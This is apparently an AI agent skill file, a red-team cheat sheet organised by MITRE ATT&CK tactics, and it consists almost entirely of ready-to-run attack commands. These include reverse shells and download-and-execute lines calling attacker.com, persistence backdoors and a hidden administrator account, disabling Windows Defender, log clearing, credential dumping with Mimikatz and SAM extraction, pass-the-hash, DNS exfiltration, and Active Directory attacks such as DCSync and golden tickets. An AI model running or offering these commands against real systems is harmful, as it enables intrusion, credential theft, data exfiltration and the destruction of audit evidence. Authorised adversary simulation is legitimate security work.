---
name: red-team-tactics
description: Red team attack tactics, techniques, and procedures (TTPs) based on MITRE ATT&CK framework. Covers reconnaissance, initial access, privilege escalation, lateral movement, and exfiltration.
---

# Red Team Tactics Skill

Advanced adversary simulation tactics based on MITRE ATT&CK framework (2025).

## MITRE ATT&CK Framework

### Reconnaissance (TA0043)
```bash
# T1592: Gather Victim Host Information
# Passive reconnaissance - no direct contact with target

# OSINT - Open Source Intelligence
theHarvester -d target.com -b all
sherlock username  # Social media search
spiderfoot -s target.com -m all

# DNS Enumeration
dnsrecon -d target.com -t std
fierce --domain target.com

# Technology Stack
whatweb https://target.com
wappalyzer https://target.com
builtwith.com lookup

# Shodan/Censys
shodan search "hostname:target.com"
censys search "target.com"

# GitHub/GitLab Dorking
# "target.com" password
# "target.com" api_key
# "target.com" secret
```

### Resource Development (TA0042)
```bash
# T1583: Acquire Infrastructure
# Set up C2 infrastructure

# Domain fronting
# Use legitimate CDN domains to hide C2 traffic

# Phishing infrastructure
gophish # Phishing framework
evilginx2 # Adversary-in-the-middle phishing
```

### Initial Access (TA0001)
```bash
# T1566: Phishing
# Spear phishing with malicious attachments or links

# Generate phishing payload
msfvenom -p windows/meterpreter/reverse_https \
  LHOST=attacker.com LPORT=443 \
  -f exe -o payload.exe

# T1190: Exploit Public-Facing Application
# Known CVE exploitation
searchsploit apache 2.4
msfconsole -x "use exploit/multi/http/apache_mod_cgi_bash_env_exec"

# T1078: Valid Accounts
# Credential stuffing
hydra -L users.txt -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"

# Password spraying
crackmapexec smb target.com -u users.txt -p 'Spring2025!' --continue-on-success
```

### Execution (TA0002)
```bash
# T1059: Command and Scripting Interpreter

# PowerShell (Windows)
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Bash (Linux)
curl http://attacker.com/payload.sh | bash

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Persistence (TA0003)
```bash
# T1053: Scheduled Task/Job
# Windows
schtasks /create /tn "Updater" /tr "C:\backdoor.exe" /sc ONLOGON /ru SYSTEM

# Linux cron
echo "* * * * * /tmp/backdoor.sh" | crontab -

# T1547: Boot or Logon Autostart Execution
# Windows Registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\backdoor.exe"

# Linux .bashrc
echo "/tmp/backdoor.sh &" >> ~/.bashrc

# T1136: Create Account
net user backdoor Password123! /add
net localgroup administrators backdoor /add
```

### Privilege Escalation (TA0004)
```bash
# Windows Privilege Escalation
# T1068: Exploitation for Privilege Escalation

# Check for vulnerabilities
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Common Windows privesc
winpeas.exe
powerup.ps1
seatbelt.exe

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# Linux Privilege Escalation
# SUID binaries
find / -perm -4000 2>/dev/null

# Sudo misconfigurations
sudo -l

# Kernel exploits
linpeas.sh
linux-exploit-suggester.sh

# GTFOBins
# https://gtfobins.github.io/
```

### Defense Evasion (TA0005)
```bash
# T1027: Obfuscated Files or Information
# Encode payloads
base64 -w0 payload.sh > encoded.txt

# T1562: Impair Defenses
# Disable Windows Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Clear logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux log clearing
echo "" > /var/log/auth.log
history -c
```

### Credential Access (TA0006)
```bash
# T1003: OS Credential Dumping

# Windows - Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Windows - SAM dump
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
secretsdump.py -sam sam.hive -system system.hive LOCAL

# Linux credentials
cat /etc/shadow
cat /etc/passwd

# T1110: Brute Force
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
john --wordlist=rockyou.txt hashes.txt

# T1555: Credentials from Password Stores
# Browser passwords
lazagne.exe all
```

### Discovery (TA0007)
```bash
# T1082: System Information Discovery
systeminfo  # Windows
uname -a    # Linux
cat /etc/os-release

# T1083: File and Directory Discovery
dir /s /b C:\Users\*password*
find / -name "*password*" 2>/dev/null

# T1069: Permission Groups Discovery
net localgroup administrators
groups

# T1016: System Network Configuration Discovery
ipconfig /all
ifconfig -a
netstat -an
```

### Lateral Movement (TA0008)
```bash
# T1021: Remote Services

# SMB/Windows Admin Shares
psexec.py domain/user:password@target cmd.exe
wmiexec.py domain/user:password@target

# T1550: Use Alternate Authentication Material
# Pass-the-Hash
pth-winexe -U domain/user%hash //target cmd.exe
crackmapexec smb target -u user -H ntlm_hash

# Pass-the-Ticket
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass domain/user@target

# T1021.001: Remote Desktop Protocol
xfreerdp /v:target /u:user /p:password

# SSH
ssh -i id_rsa user@target
```

### Collection (TA0009)
```bash
# T1560: Archive Collected Data
# Compress sensitive data
7z a -p"password" data.7z C:\Users\*\Documents\*

# T1005: Data from Local System
findstr /si "password" *.txt *.xml *.config
grep -r "password" /var/www/html/
```

### Command and Control (TA0011)
```bash
# T1071: Application Layer Protocol
# HTTP/HTTPS C2
# Use legitimate services (Slack, Discord, cloud storage)

# T1572: Protocol Tunneling
# DNS tunneling
dnscat2 --dns server=attacker.com
iodine -f -P password attacker.com

# T1573: Encrypted Channel
# Encrypted C2 channels
# Cobalt Strike, Havoc, Sliver
```

### Exfiltration (TA0010)
```bash
# T1041: Exfiltration Over C2 Channel
# Use existing C2 for data exfiltration

# T1567: Exfiltration Over Web Service
# Upload to cloud storage
curl -X PUT -T data.zip "https://storage.googleapis.com/bucket/data.zip"

# DNS exfiltration
# Encode data in DNS queries
cat data.txt | xxd -p | while read line; do dig $line.attacker.com; done
```

## Active Directory Attacks

### Kerberoasting
```bash
# Request service tickets
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request

# Crack tickets
hashcat -m 13100 tickets.txt rockyou.txt
```

### AS-REP Roasting
```bash
# Find accounts without pre-auth
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip DC_IP

# Crack hashes
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

### DCSync
```bash
# Requires replication rights
secretsdump.py domain/admin:password@DC_IP -just-dc
```

### Golden Ticket
```bash
# Create golden ticket with mimikatz
kerberos::golden /user:Administrator /domain:domain.local \
  /sid:S-1-5-21-... /krbtgt:HASH /id:500
```

## Detection Evasion Tips

1. **Use living-off-the-land binaries (LOLBins)**
2. **Encrypt all network traffic**
3. **Operate during business hours**
4. **Mimic legitimate user behavior**
5. **Use trusted processes for execution**
6. **Clear tracks and logs**

## Reporting Template

```markdown
## Attack Narrative
Timeline of attack progression from initial access to objectives.

## TTPs Used
Mapped to MITRE ATT&CK framework.

## Findings
1. Initial access vector exploited
2. Privilege escalation path
3. Data accessed

## Detection Gaps
Where security controls failed.

## Recommendations
Specific improvements for each gap.
```
